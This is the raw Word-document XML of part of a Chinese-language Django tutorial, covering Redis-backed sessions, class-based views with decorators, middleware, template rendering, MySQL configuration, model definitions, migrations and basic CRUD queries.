    <w:p w14:paraId="096D071C"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req_url = reverse('users:index')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B67F69"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return redirect(req_url)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1242A881"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1.8状态保持之session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224709AC"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1）将session信息保存到redis中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4AD6CA"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lastRenderedPageBreak/>
        <w:t>CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441ECBEA"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"default": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C81A340"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"BACKEND": "django_redis.cache.RedisCache",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4460C6E2"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"LOCATION": "redis://127.0.0.1:6379/1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FBAB706"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"OPTIONS": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="490C42BC"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"CLIENT_CLASS": "django_redis.client.DefaultClient",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7669132A"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38112F8A"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 xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06598F96"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E627CA"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SESSION_ENGINE = "django.contrib.sessions.backends.cache"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C912FFE"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SESSION_CACHE_ALIAS = "default"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EB2BA4"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2)设置session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F622E6"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request.session['&lt;key&gt;'] = '&lt;value&gt;'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA58FB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3)获取session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73886315" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="009E5F6C" w:rsidRDefault="00870C85" w:rsidP="009E5F6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9E5F6C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>request.session.get('&lt;key&gt;')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524E0E85"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1.9类视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178FE1C1"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1.9.1类视图的使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D47000"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1）定义类视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D95D0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/register/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD2DC1D"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class RegisterView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16532712"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get(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0E8B8C"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HttpResponse('</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回注册页面</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0C4191"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post(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3C2AFF"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HttpResponse('</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>进行注册处理</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="484A51E0"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put(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6633E506"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HttpResponse('put</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法被调用</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE6118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2）进行url配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683BA65C"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url(r'^register/$',views.RegisterView.as_view())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5369FF59"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lastRenderedPageBreak/>
        <w:t>1.9.2类视图添加装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2475D0B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使用Django框架提供method_decorator将针对函数视图装饰器添加到类视图的方法上面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D434E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为全部请求方法添加装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FF300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@method_decorator(my_decorator, name='dispatch')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E264C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class DemoView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D40A672"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get(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043E24D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print('get</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F17A272"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HttpResponse('ok')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BFC98E"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post(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A413C4"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print('post</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70EB32AE" w14:textId="33927E5F"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HttpResponse('ok')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A04213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为特定请求方法添加装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7C0DE1"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@method_decorator(my_decorator, name='get')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412D601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class DemoView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04CBDC5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get(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD015B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print('get</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A21306D" w14:textId="174E57FF"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HttpResponse('ok')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="664BB22B"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post(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FEFD1B"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print('post</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5140B45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HttpResponse('ok')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A53955F"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1.10中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3396370D"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1.10.1定义中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CAC9E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def simple_middleware(get_response):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D575F8B" w14:textId="15F94810"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>此处编写的代码仅在</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>第一次配置和初始化的时候执行一次。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF957B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 middleware(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE96F49" w14:textId="5E239433"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>此处编写的代码会在每个请求处理视图前被调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="645A3D09" w14:textId="5BCCE2BF"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response = get_response(request)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD34BA1" w14:textId="0D5D9FEC"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>此处编写的代码会在每个请求处理视图之后被调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2A60BD" w14:textId="5484FFFE"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response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCE088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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    return middleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242A0307"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1.10.2 在MIDDLEWARE中注册中间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC2F12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MIDDLEWARE = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23AADF5B"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'django.middleware.security.SecurityMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D476CB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'django.contrib.sessions.middleware.SessionMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68228D5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'django.middleware.common.CommonMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1094E29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 'django.middleware.csrf.CsrfViewMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC5F6ED"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'django.contrib.auth.middleware.AuthenticationMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579EB8C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'django.contrib.messages.middleware.MessageMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F23FD4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'django.middleware.clickjacking.XFrameOptionsMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B8ECE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'users.middleware.my_middleware',  # </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>添加中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B653ED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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6628D802"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1.10.3注意：中间件是全局的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F3A203"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1.11使用模板的详细步骤</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689B2C65"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1.加载模板：指定使用模板文件，获取模板对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240320B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from django.template import loader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270A05C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temp = loader.get_template('模板文件名')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468BCD0D"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2.模板渲染：给模板文件传递变量，将模板文件中的变量进行替换，获取替换之后的html内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4642F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res_html = temp.render(字典)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E82DB8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3.创建响应对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2C00D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return HttpResponse(res_html)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C290030"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1.12数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF90162"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1.12.1数据库链接配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB7058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1.在settings.py进行配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5C390D"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DATABASES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F05914D"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'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A3E7D4"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'ENGINE': 'django.db.backends.mysql',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320173F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'HOST': '127.0.0.1',  # </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据库主机</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CCB0DFD"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'PORT': 3306,  # </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据库端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E4B0C1"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'USER': 'root',  # </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据库用户名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245D89BF"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        'PASSWORD': 'mysql',  # </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据库用户密码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337A2F9E"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'NAME': 'django_demo'  # </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据库名字</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718181F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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106391BD"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DAAB5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2.首次启动时需要在项目同名的目录</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.py添加</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEC24D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pip install pymysql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074E05B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import pymysql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573E7E3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pymysql.install_as_MySQLdb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="137C24E6"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1.12.2定义模型类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA05224"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class </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>模型类名</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7BE69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 </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> = models.</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>字段类型</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>选项参数</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254A6C4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 ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33289A7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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BA835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class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094CD48F"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db_table = '&lt;</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>表名</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>&gt;'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6383176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定义外键属性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37261074"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hbook = models.ForeignKey(BookInfo, on_delete=models.CASCADE, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>图书</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">')  # </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>外键</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A520EE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cascade</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是级联，删除主表数据时连同外键表中数据一起删除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491288D0"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1.12.3迁移生成表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671765A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1）生成迁移文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A4C76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python manage.py makemigrations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5782E30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2）同步到数据库中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534B91B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python manage.py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152269C9"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1.12.4通过模型类和对象进行数据库操作（增删改查）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6440F5F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新增</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2A1766" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>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创建模型类对象--&gt;对象.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D05CC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：添加HeroInfo时，可以给hbook赋值，也可以直接表中hbook_id赋值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C84050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HeroInfo是定义的英雄模型类，与图书BookInfo对应。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC1A301" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>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模型类.objects.create(...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32971F74"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修改</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9E608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 查询对象-&gt;修改对象属性-&gt;对象.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EB295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 模型类.objects.filter(...).update(...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509E9F5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lastRenderedPageBreak/>
        <w:t>删除</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70539C2D" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>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查询对象-&gt;对象.delete()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529B66CE" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>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模型类.objects.filter(...).delete()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC3BB70"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查询</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FA7FE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基本查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160A381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模型类.objects.查询函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2117469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条件查询</w:t>
